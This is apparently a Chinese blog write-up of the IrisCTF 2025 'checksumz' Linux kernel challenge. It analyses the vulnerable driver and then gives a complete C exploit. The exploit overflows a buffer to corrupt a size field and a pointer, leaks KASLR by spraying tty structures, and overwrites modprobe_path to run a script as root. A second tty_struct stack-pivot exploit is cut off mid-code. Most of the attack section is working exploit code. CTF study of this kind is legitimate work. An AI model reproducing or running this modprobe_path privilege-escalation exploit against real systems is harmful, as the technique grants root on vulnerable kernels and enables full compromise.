href=\"https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/\">https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/</a></p>\n","excerpt":"","more":"<p>用2025 irisctf checksumz 来学习modprobe path来任意代码执行</p>\n<p><a href=\"https://github.com/IrisSec/IrisCTF-2025-Challenges/tree/main/checksumz\">https://github.com/IrisSec/IrisCTF-2025-Challenges/tree/main/checksumz</a></p>\n<p>题目有四个基础功能，都是对一个结构体进行操作</p>\n<pre><code class=\"hljs c\"><span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">checksum_buffer</span> &#123;</span>\n        <span class=\"hljs-type\">loff_t</span> pos;\n        <span class=\"hljs-type\">char</span> state[<span class=\"hljs-number\">512</span>];\n        <span class=\"hljs-type\">size_t</span> size;\n        <span class=\"hljs-type\">size_t</span> read;\n        <span class=\"hljs-type\">char</span>* name;\n        <span class=\"hljs-type\">uint32_t</span> s1;\n        <span class=\"hljs-type\">uint32_t</span> s2;\n&#125;;</code></pre>\n<p>初始化</p>\n<pre><code class=\"hljs c\">buffer-&gt;pos = <span class=\"hljs-number\">0</span>;\nbuffer-&gt;size = <span class=\"hljs-number\">512</span>;\nbuffer-&gt;read = <span class=\"hljs-number\">0</span>;\nbuffer-&gt;name = kzalloc(<span class=\"hljs-number\">1000</span>, GFP_KERNEL);\nbuffer-&gt;s1 = <span class=\"hljs-number\">1</span>;\nbuffer-&gt;s2 = <span class=\"hljs-number\">0</span>;</code></pre>\n<p>name在内核堆创造了一个空间为1000的堆块，放在kmalloc-1024</p>\n<p>read</p>\n<pre><code class=\"hljs c\"><span class=\"hljs-type\">static</span> <span class=\"hljs-type\">ssize_t</span> <span class=\"hljs-title function_\">checksumz_read_iter</span><span class=\"hljs-params\">(<span class=\"hljs-keyword\">struct</span> kiocb *iocb, <span class=\"hljs-keyword\">struct</span> iov_iter *to)</span> &#123;\n        <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">checksum_buffer</span>* <span class=\"hljs-title\">buffer</span> =</span> iocb-&gt;ki_filp-&gt;private_data;\n        <span class=\"hljs-type\">size_t</span> bytes = iov_iter_count(to);\n\n        <span class=\"hljs-keyword\">if</span> (!buffer)\n                <span class=\"hljs-keyword\">return</span> -EBADFD;\n        <span class=\"hljs-keyword\">if</span> (!bytes)\n                <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;\n        <span class=\"hljs-keyword\">if</span> (buffer-&gt;read &gt;= buffer-&gt;size) &#123;\n                buffer-&gt;read = <span class=\"hljs-number\">0</span>;\n                <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;\n        &#125;\n\n        <span class=\"hljs-type\">ssize_t</span> copied = copy_to_iter(buffer-&gt;state + buffer-&gt;pos, min(bytes, <span class=\"hljs-number\">256</span>), to);\n\n        buffer-&gt;read += copied;\n        buffer-&gt;pos += copied;\n        <span class=\"hljs-keyword\">if</span> (buffer-&gt;pos &gt;= buffer-&gt;size)\n                buffer-&gt;pos = buffer-&gt;size - <span class=\"hljs-number\">1</span>;\n\n        <span class=\"hljs-keyword\">return</span> copied;\n&#125;</code></pre>\n<p>最多能读256个字节</p>\n<p>Ioctl 功能</p>\n<pre><code class=\"hljs c\"><span class=\"hljs-type\">static</span> <span class=\"hljs-type\">long</span> <span class=\"hljs-title function_\">checksumz_ioctl</span><span class=\"hljs-params\">(<span class=\"hljs-keyword\">struct</span> file *file, <span class=\"hljs-type\">unsigned</span> <span class=\"hljs-type\">int</span> command, <span class=\"hljs-type\">unsigned</span> <span class=\"hljs-type\">long</span> arg)</span> &#123;\n        <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">checksum_buffer</span>* <span class=\"hljs-title\">buffer</span> =</span> file-&gt;private_data;\n\n        <span class=\"hljs-keyword\">if</span> (!file-&gt;private_data)\n                <span class=\"hljs-keyword\">return</span> -EBADFD;\n        \n        <span class=\"hljs-keyword\">switch</span> (command) &#123;\n                <span class=\"hljs-keyword\">case</span> CHECKSUMZ_IOCTL_RESIZE:\n                        <span class=\"hljs-keyword\">if</span> (arg &lt;= buffer-&gt;size &amp;&amp; arg &gt; <span class=\"hljs-number\">0</span>) &#123;\n                                buffer-&gt;size = arg;\n                                buffer-&gt;pos = <span class=\"hljs-number\">0</span>;\n                        &#125; <span class=\"hljs-keyword\">else</span>\n                                <span class=\"hljs-keyword\">return</span> -EINVAL;\n\n                        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;\n                <span class=\"hljs-keyword\">case</span> CHECKSUMZ_IOCTL_RENAME:\n                        <span class=\"hljs-type\">char</span> __user *user_name_buf = (<span class=\"hljs-type\">char</span> __user*) arg;\n\n                        <span class=\"hljs-keyword\">if</span> (copy_from_user(buffer-&gt;name, user_name_buf, <span class=\"hljs-number\">48</span>)) &#123;\n                                <span class=\"hljs-keyword\">return</span> -EFAULT;\n                        &#125;\n\n                        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;\n                <span class=\"hljs-keyword\">case</span> CHECKSUMZ_IOCTL_PROCESS:\n                        adler32(buffer-&gt;state, buffer-&gt;size, &amp;buffer-&gt;s1, &amp;buffer-&gt;s2);\n                        <span class=\"hljs-built_in\">memset</span>(buffer-&gt;state, <span class=\"hljs-number\">0</span>, buffer-&gt;size);\n                        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;\n                <span class=\"hljs-keyword\">case</span> CHECKSUMZ_IOCTL_DIGEST:\n                        <span class=\"hljs-type\">uint32_t</span> __user *user_digest_buf = (<span class=\"hljs-type\">uint32_t</span> __user*) arg;\n                        <span class=\"hljs-type\">uint32_t</span> digest = buffer-&gt;s1 | (buffer-&gt;s2 &lt;&lt; <span class=\"hljs-number\">16</span>);\n\n                        <span class=\"hljs-keyword\">if</span> (copy_to_user(user_digest_buf, &amp;digest, <span class=\"hljs-keyword\">sizeof</span>(<span class=\"hljs-type\">uint32_t</span>))) &#123;\n                                <span class=\"hljs-keyword\">return</span> -EFAULT;\n                        &#125;\n\n                        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;\n                <span class=\"hljs-keyword\">default</span>:\n                        <span class=\"hljs-keyword\">return</span> -EINVAL;\n        &#125;\n\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;\n&#125;</code></pre>\n<p>这里除了rename其他功能对攻击没帮助，有这些只是为了符合题目场景</p>\n<p>Write</p>\n<pre><code class=\"hljs c\"><span class=\"hljs-type\">static</span> <span class=\"hljs-type\">ssize_t</span> <span class=\"hljs-title function_\">checksumz_write_iter</span><span class=\"hljs-params\">(<span class=\"hljs-keyword\">struct</span> kiocb *iocb, <span class=\"hljs-keyword\">struct</span> iov_iter *from)</span> &#123;\n        <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">checksum_buffer</span>* <span class=\"hljs-title\">buffer</span> =</span> iocb-&gt;ki_filp-&gt;private_data;\n        <span class=\"hljs-type\">size_t</span> bytes = iov_iter_count(from);\n \n        <span class=\"hljs-keyword\">if</span> (!buffer)\n                        <span class=\"hljs-keyword\">return</span> -EBADFD;\n        <span class=\"hljs-keyword\">if</span> (!bytes)\n                        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;\n\n                <span class=\"hljs-type\">ssize_t</span> copied = copy_from_iter(buffer-&gt;state + buffer-&gt;pos, min(bytes, <span class=\"hljs-number\">16</span>), from);\n \n                buffer-&gt;pos += copied;\n                <span class=\"hljs-keyword\">if</span> (buffer-&gt;pos &gt;= buffer-&gt;size)\n                        buffer-&gt;pos = buffer-&gt;size - <span class=\"hljs-number\">1</span>;\n                \n        <span class=\"hljs-keyword\">return</span> copied;\n&#125;</code></pre>\n<p>可以往buf偏移上写最多16字节，这里配合下一个功能可以实现一些奇特的功能</p>\n<p>Lseek</p>\n<pre><code class=\"hljs c\"><span class=\"hljs-type\">static</span> <span class=\"hljs-type\">loff_t</span> <span class=\"hljs-title function_\">checksumz_llseek</span><span class=\"hljs-params\">(<span class=\"hljs-keyword\">struct</span> file *file, <span class=\"hljs-type\">loff_t</span> offset, <span class=\"hljs-type\">int</span> whence)</span> &#123;\n        <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">checksum_buffer</span>* <span class=\"hljs-title\">buffer</span> =</span> file-&gt;private_data;\n\n        <span class=\"hljs-keyword\">switch</span> (whence) &#123;\n                <span class=\"hljs-keyword\">case</span> SEEK_SET:\n                        buffer-&gt;pos = offset;\n                        <span class=\"hljs-keyword\">break</span>;\n                <span class=\"hljs-keyword\">case</span> SEEK_CUR:\n                        buffer-&gt;pos += offset;\n                        <span class=\"hljs-keyword\">break</span>;\n                <span class=\"hljs-keyword\">case</span> SEEK_END:\n                        buffer-&gt;pos = buffer-&gt;size - offset;\n                        <span class=\"hljs-keyword\">break</span>;\n                <span class=\"hljs-keyword\">default</span>:\n                        <span class=\"hljs-keyword\">return</span> -EINVAL;\n        &#125;\n\n        <span class=\"hljs-keyword\">if</span> (buffer-&gt;pos &lt; <span class=\"hljs-number\">0</span>)\n                buffer-&gt;pos = <span class=\"hljs-number\">0</span>;\n\n        <span class=\"hljs-keyword\">if</span> (buffer-&gt;pos &gt;= buffer-&gt;size)\n                buffer-&gt;pos = buffer-&gt;size - <span class=\"hljs-number\">1</span>;\n\n        <span class=\"hljs-keyword\">return</span> buffer-&gt;pos;\n&#125;</code></pre>\n<p>可以改pos为任意小于size的值，如果把pos改成512可以溢出15字节。这15字节可以覆盖size到一个很大的值，实现相对任意写。</p>\n<pre><code class=\"hljs c\"><span class=\"hljs-type\">char</span>* name;</code></pre>\n<p>可见name为指针，不难想到覆盖指针来利用rename来进行任意写</p>\n<p>POC</p>\n<pre><code class=\"hljs c\"><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&quot;api.h&quot;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdio.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdlib.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdint.h&gt;</span></span>\n\n<span class=\"hljs-type\">int</span> fd;\n\n<span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">main</span><span class=\"hljs-params\">()</span> &#123;\n        fd = open(<span class=\"hljs-string\">&quot;/dev/checksumz&quot;</span>, O_RDWR);\n        lseek(fd, <span class=\"hljs-number\">512</span>, SEEK_SET);\n        <span class=\"hljs-type\">unsigned</span> <span class=\"hljs-type\">long</span> buf[<span class=\"hljs-number\">2</span>];\n        <span class=\"hljs-built_in\">memset</span>(buf, <span class=\"hljs-number\">0xff</span>, <span class=\"hljs-keyword\">sizeof</span>(buf));\n        write(fd, buf, <span class=\"hljs-keyword\">sizeof</span>(buf));\n&#125;</code></pre>\n<p><img src=\"/pic/output.jpg\" alt=\"\"></p>\n<p>size已经被覆盖成0xffffffffffffffff，这样可以改pos来进行相对任意写和读。</p>\n<p>为了能够知道内核地址，我们需要拿到kaslr基地址。可以利用tty_struct 来创造含有内核地址的堆块</p>\n<pre><code class=\"hljs C\"><span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> i=<span class=\"hljs-number\">0</span>;i&lt;<span class=\"hljs-number\">0x100</span>;i++)&#123; spray[i] = open(<span class=\"hljs-string\">&quot;/dev/ptmx&quot;</span>, O_RDONLY | O_NOCTTY); &#125;</code></pre>\n<p>这样在buf下面会有tty堆块可以读。在泄漏过程中可能会出现泄漏不成功，可以选择多创造点堆块来提升稳定性和在不同位置读堆块来稳定的获得基地址。</p>\n<p><img src=\"/pic/1fc6b364-f6cc-40ff-964d-6de02e1ff1de.jpg\" alt=\"\"></p>\n<p>最后，把name指针改为modprobe_path来覆盖为/tmp/x，这样可以在root权限进行任意代码。</p>\n<p>modprobe</p>\n<p>完整exp</p>\n<pre><code class=\"hljs c\"><span class=\"hljs-comment\">//192.168.64.6:8080/exp</span>\n\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&quot;api.h&quot;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdio.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdlib.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdint.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdio.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;sys/types.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;sys/stat.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;fcntl.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;sched.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;sys/mman.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;signal.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;sys/syscall.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;sys/ioctl.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;linux/userfaultfd.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;sys/wait.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;poll.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;unistd.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdlib.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;string.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;pthread.h&gt;</span></span>\n\n<span class=\"hljs-type\">int</span> fd, spray[<span class=\"hljs-number\">0x100</span>];\n<span class=\"hljs-type\">unsigned</span> <span class=\"hljs-type\">long</span> user_ss, user_sp, user_cs, user_rflags, kaslr;\n\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">define</span> modprobe_path kaslr+0x1b3f100</span>\n\n<span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">save_state</span><span class=\"hljs-params\">()</span>&#123;\n        __asm__(\n                <span class=\"hljs-string\">&quot;.intel_syntax noprefix;&quot;</span>\n                <span class=\"hljs-string\">&quot;mov user_cs, cs;&quot;</span>\n                <span class=\"hljs-string\">&quot;mov user_ss, ss;&quot;</span>\n                <span class=\"hljs-string\">&quot;mov user_sp, rsp;&quot;</span>\n                <span class=\"hljs-string\">&quot;pushf;&quot;</span>\n                <span class=\"hljs-string\">&quot;pop user_rflags;&quot;</span>\n                <span class=\"hljs-string\">&quot;.att_syntax;&quot;</span>\n           );\n&#125;\n\n\n<span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">shell</span><span class=\"hljs-params\">()</span>&#123;\n        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;[+] UID %d\\n&quot;</span>,getuid());\n        system(<span class=\"hljs-string\">&quot;/bin/sh&quot;</span>);\n&#125;\n\n\n<span class=\"hljs-type\">unsigned</span> <span class=\"hljs-type\">long</span> user_rip = (<span class=\"hljs-type\">unsigned</span> <span class=\"hljs-type\">long</span>)shell;\n\n<span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">main</span><span class=\"hljs-params\">()</span> &#123;\n        save_state();\n        <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> i=<span class=\"hljs-number\">0</span>;i&lt;<span class=\"hljs-number\">0x80</span>;i++)&#123; spray[i] = open(<span class=\"hljs-string\">&quot;/dev/ptmx&quot;</span>, O_RDONLY | O_NOCTTY); &#125;\n        fd = open(<span class=\"hljs-string\">&quot;/dev/checksumz&quot;</span>, O_RDWR);\n        <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> i=<span class=\"hljs-number\">0x80</span>;i&lt;<span class=\"hljs-number\">0x100</span>;i++)&#123; spray[i] = open(<span class=\"hljs-string\">&quot;/dev/ptmx&quot;</span>, O_RDONLY | O_NOCTTY); &#125;\n        lseek(fd, <span class=\"hljs-number\">512</span>, SEEK_SET);\n\n        <span class=\"hljs-type\">int</span> good;\n        <span class=\"hljs-type\">unsigned</span> <span class=\"hljs-type\">long</span> buf[<span class=\"hljs-number\">2</span>];\n        <span class=\"hljs-built_in\">memset</span>(buf, <span class=\"hljs-number\">0xff</span>, <span class=\"hljs-keyword\">sizeof</span>(buf));\n        write(fd, buf, <span class=\"hljs-keyword\">sizeof</span>(buf));\n        <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> i=<span class=\"hljs-number\">0</span>;i&lt;<span class=\"hljs-number\">8</span>;i++)&#123;\n                lseek(fd, <span class=\"hljs-number\">1048</span>+i*<span class=\"hljs-number\">1024</span>, SEEK_SET);\n                read(fd, buf, <span class=\"hljs-number\">8</span>);\n                kaslr = buf[<span class=\"hljs-number\">0</span>] - <span class=\"hljs-number\">0x1289480</span>;\n                <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;%lx\\n&quot;</span>, kaslr);\n                <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;%lx\\n&quot;</span>, (kaslr &amp; ~<span class=\"hljs-number\">0xffffff</span>));\n                <span class=\"hljs-keyword\">if</span>((kaslr &amp; ~<span class=\"hljs-number\">0xffffff</span>) == kaslr)&#123;\n                        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;kaslr %lx\\n&quot;</span>, kaslr);\n                        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;modprobe_path %lx\\n&quot;</span>, modprobe_path);\n                        good = <span class=\"hljs-number\">1</span>;\n                        <span class=\"hljs-keyword\">break</span>;\n                &#125;\n        &#125;\n        <span class=\"hljs-comment\">//puts(&quot;Done&quot;);</span>\n        <span class=\"hljs-keyword\">if</span>(!good)&#123;\n                <span class=\"hljs-built_in\">puts</span>(<span class=\"hljs-string\">&quot;[x] exploit failed&quot;</span>);\n                <span class=\"hljs-built_in\">exit</span>(<span class=\"hljs-number\">0</span>);\n        &#125;\n        lseek(fd, <span class=\"hljs-number\">528</span>, SEEK_SET);\n        buf[<span class=\"hljs-number\">0</span>] = modprobe_path;\n        write(fd, buf, <span class=\"hljs-number\">8</span>);\n        <span class=\"hljs-type\">char</span> *path = <span class=\"hljs-string\">&quot;/tmp/x&quot;</span>;\n        ioctl(fd, CHECKSUMZ_IOCTL_RENAME, (<span class=\"hljs-type\">uint64_t</span> *)path);\n\n        system(<span class=\"hljs-string\">&quot;echo &#x27;#!/bin/sh\\ncp /dev/vda /tmp/flag\\nchmod 777 /tmp/flag&#x27; &gt; /tmp/x&quot;</span>);\n        system(<span class=\"hljs-string\">&quot;chmod +x /tmp/x&quot;</span>);\n        system(<span class=\"hljs-string\">&quot;echo -ne &#x27;\\\\xff\\\\xff\\\\xff\\\\xff&#x27; &gt; /tmp/dummy&quot;</span>);\n        system(<span class=\"hljs-string\">&quot;chmod +x /tmp/dummy&quot;</span>);\n        system(<span class=\"hljs-string\">&quot;/tmp/dummy&quot;</span>);\n        system(<span class=\"hljs-string\">&quot;cat /tmp/flag&quot;</span>);\n\n&#125;</code></pre>\n<p>可能讲的不好，有建议或者讲错或讲的不对都可以提出来。这解是给预期，预期解如果能做出来可能会再写篇文章。：）</p>\n<p>tty_struct 打法</p>\n<pre><code class=\"hljs c\"><span class=\"hljs-comment\">//192.168.64.6:8080/exp</span>\n\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&quot;api.h&quot;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdio.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdlib.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdint.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdio.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;sys/types.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;sys/stat.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;fcntl.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;sched.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;sys/mman.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;signal.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;sys/syscall.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;sys/ioctl.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;linux/userfaultfd.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;sys/wait.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;poll.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;unistd.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdlib.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;string.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;pthread.h&gt;</span></span>\n\n<span class=\"hljs-type\">int</span> fd, spray[<span class=\"hljs-number\">0x100</span>];\n<span class=\"hljs-type\">unsigned</span> <span class=\"hljs-type\">long</span> user_ss, user_sp, user_cs, user_rflags, kaslr, name[<span class=\"hljs-number\">1</span>];\n\n<span class=\"hljs-comment\">//#define modprobe_path kaslr+0x1b3f100</span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">define</span> pivot kaslr+0x185b884</span>\n\n<span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">save_state</span><span class=\"hljs-params\">()</span>&#123;\n        __asm__(\n                <span class=\"hljs-string\">&quot;.intel_syntax noprefix;&quot;</span>\n                <span class=\"hljs-string\">&quot;mov user_cs, cs;&quot;</span>\n                <span class=\"hljs-string\">&quot;mov user_ss, ss;&quot;</span>\n                <span class=\"hljs-string\">&quot;mov user_sp, rsp;&quot;</span>\n                <span class=\"hljs-string\">&quot;pushf;&quot;</span>\n                <span class=\"hljs-string\">&quot;pop user_rflags;&quot;</span>\n                <span class=\"hljs-string\">&quot;.att_syntax;&quot;</span>\n           );\n&#125;\n\n\n<span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">shell</span><span class=\"hljs-params\">()</span>&#123;\n        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;[+] UID %d\\n&quot;</span>,getuid());\n        system(<span class=\"hljs-string\">&quot;/bin/sh&quot;</span>);\n&#125;\n\n\n<span class=\"hljs-type\">unsigned</span> <span class=\"hljs-type\">long</span> user_rip = (<span class=\"hljs-type\">unsigned</span> <span class=\"hljs-type\">long</span>)shell;\n\n<span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">main</span><span class=\"hljs-params\">()</span> &#123;\n        save_state();\n        <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> i=<span class=\"hljs-number\">0</span>;i&lt;<span class=\"hljs-number\">0x80</span>;i++)&#123; spray[i] = open(<span class=\"hljs-string\">&quot;/dev/ptmx&quot;</span>, O_RDONLY | O_NOCTTY); &#125;\n        fd = open(<span class=\"hljs-string\">&quot;/dev/checksumz&quot;</span>, O_RDWR);\n        <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> i=<span class=\"hljs-number\">0x80</span>;i&lt;<span class=\"hljs-number\">0x100</span>;i++)&#123; spray[i] = open(<span class=\"hljs-string\">&quot;/dev/ptmx&quot;</span>, O_RDONLY | O_NOCTTY); &#125;\n\n        lseek(fd, <span class=\"hljs-number\">512</span>, SEEK_SET);\n\n        <span class=\"hljs-type\">int</span> good = <span class=\"hljs-number\">0</span>;\n        <span class=\"hljs-type\">unsigned</span> <span class=\"hljs-type\">long</span> buf[<span class=\"hljs-number\">2</span>];\n        <span class=\"hljs-built_in\">memset</span>(buf, <span class=\"hljs-number\">0xff</span>, <span class=\"hljs-keyword\">sizeof</span>(buf));\n        write(fd, buf, <span class=\"hljs-keyword\">sizeof</span>(buf));\n        <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> i=<span class=\"hljs-number\">0</span>;i&lt;<span class=\"hljs-number\">8</span>;i++)&#123;\n                lseek(fd, <span class=\"hljs-number\">1048</span>+i*<span class=\"hljs-number\">1024</span>, SEEK_SET);\n                read(fd, buf, <span class=\"hljs-number\">8</span>);\n                kaslr = buf[<span class=\"hljs-number\">0</span>] - <span class=\"hljs-number\">0x1289480</span>;\n                <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;%lx\\n&quot;</span>, buf[<span class=\"hljs-number\">0</span>]);\n                <span class=\"hljs-keyword\">if</span>((kaslr &amp; ~<span class=\"hljs-number\">0xfffff</span>) == kaslr)&#123;\n                        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;kaslr %lx\\n&quot;</span>, kaslr);\n                        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;modprobe_path %lx\\n&quot;</span>, pivot);\n                        good = <span class=\"hljs-number\">1</span>;\n                        <span class=\"hljs-keyword\">break</span>;\n                &#125;\n        &#125;\n        <span class=\"hljs-comment\">//puts(&quot;Done&quot;);</span>\n        <span class=\"hljs-keyword\">if</span>(!good)&#123;\n                <span class=\"hljs-built_in\">puts</span>(<span class=\"hljs-string\">&quot;[x] exploit failed&quot;</span>);\n                <span class=\"hljs-built_in\">exit</span>(<span class=\"hljs-number\">0</span>);\n        &#125;\n        lseek(fd, <span class=\"hljs-number\">528</span>, SEEK_SET);\n        read(fd, buf, <span class=\"hljs-number\">8</span>);\n        name[<span class=\"hljs-number\">0</span>] = buf[<span class=\"hljs-number\">0</span>];\n        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;name addr %lx\\n&quot;</span>, name[<span class=\"hljs-number\">0</span>]);\n        lseek(fd, <span class=\"hljs-number\">528</span>, SEEK_SET);\n\n        <span class=\"hljs-type\">unsigned</span> <span class=\"hljs-type\">long</span> fake_ops[<span class=\"hljs-number\">4</span>];\n        <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> t=<span class=\"hljs-number\">0</span>;t&lt;<span class=\"hljs-number\">16</span>;t++)&#123;\n                <span class=\"hljs-comment\">//for(int i=0;i&lt;4;i++)&#123; fake_ops[i] = 0xffffffffdead0000 + ((i+t*4) &lt;&lt; 8); &#125;</span>\n                <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> i=<span class=\"hljs-number\">0</span>;i&lt;<span class=\"hljs-number\">4</span>;i++)&#123; fake_ops[i] = pivot; &#125;\n                ioctl(fd, CHECKSUMZ_IOCTL_RENAME, (<span class=\"hljs-type\">uint64_t</span> *)fake_ops);\n                name[<span class=\"hljs-number\">0</span>] += <span class=\"hljs-number\">32</span>;\n                write(fd, name, <span class=\"hljs-number\">8</span>);\n                lseek(fd, <span class=\"hljs-number\">528</span>, SEEK_SET);\n        &#125;\n        name[<span class=\"hljs-number\">0</span>] -= <span class=\"hljs-number\">512</span>;\n        lseek(fd, <span class=\"hljs-number\">1048</span>, SEEK_SET);\n        write(fd, name, <span class=\"hljs-number\">8</span>);\n\n        <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> i=<span class=\"hljs-number\">0</span>;i&lt;<span 